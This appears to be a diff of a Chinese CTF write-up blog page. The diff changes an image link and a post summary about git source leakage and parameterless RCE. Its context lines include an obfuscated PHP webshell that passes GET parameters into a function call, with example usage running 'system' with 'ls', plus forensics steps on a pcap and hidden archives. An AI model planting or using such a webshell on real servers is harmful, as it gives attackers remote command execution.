@@ -529,7 +529,7 @@ hp_value short_open_tag 1</code></pre><p>那么我们就能把aaa扩展当做php
 &lt;?= ${$_______}["_"](${$_______}["__"]) # $_GET['_']($_GET['__']) ?&gt;</code></pre>
 <p>webshell如图，最后<code>?_=system&amp;__=ls</code></p>
 <h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="大杂烩"><a href="#大杂烩" class="headerlink" title="大杂烩"></a>大杂烩</h2><p>给了一个pcap，按照大小追踪HTTP流</p>
-<p><img src="https://i.loli.net/2020/05/06/XOa31VvBhb8zeil.jpg" alt="Snipaste_2020-05-06_13-12-13.jpg"></p>
+<p><img src="https://i.loli.net/2020/05/13/8Oj64XLEIPSDpgw.jpg" alt="Snipaste_2020-05-06_13-12-13.jpg"></p>
 <p>把png提取出来（可以直接复制hex码），发现是一个网盘的url，下载。</p>
 <p>windows打不开这个憨憨word文档，改为rar成功拿到压缩包，爆破出密码DE34Q1。</p>
 <p>图片binwalk，一开始虚拟机出了点问题，同学给我的压缩包不全。。。但是自己binwalk出的包就能看出ntfs流。。。555提取出来就好了</p>
@@ -734,9 +734,8 @@ X-Powered-By: PHP/5.4.16用户
                     <div class="summary block-with-text">
                         
                             Webpingpingping在昨天的https://www.hackyangtuo.top/posts/ab7.html#toc-heading-1写过了
-禁止套娃啥都没有，扫描器扫出来了git源码泄露
-
-        document
+禁止套娃考察：git源码泄露，无参数RCE                
+啥都没
                         
                     </div>
                     <div class="publish-info">
